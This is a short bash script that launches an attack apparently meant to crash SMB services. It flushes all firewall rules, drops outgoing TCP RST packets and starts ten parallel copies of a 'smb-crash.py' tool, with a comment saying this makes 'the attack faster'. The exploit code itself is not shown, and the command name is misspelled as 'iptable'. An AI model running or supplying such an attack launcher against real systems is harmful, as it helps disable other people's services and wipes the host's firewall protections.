#!/bin/bash
#

# Apply firewall rule 
# This script adjusts the firewall to block outgoing RST packets

iptable -F
iptable -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

# This script runs 10 threads to make the attack faster.

python smb-crash.py 0 &
python smb-crash.py 1000 &
python smb-crash.py 2000 &
python smb-crash.py 3000 &
python smb-crash.py 4000 &
python smb-crash.py 5000 &
python smb-crash.py 6000 &
python smb-crash.py 7000 &
python smb-crash.py 8000 &
python smb-crash.py 9000 &
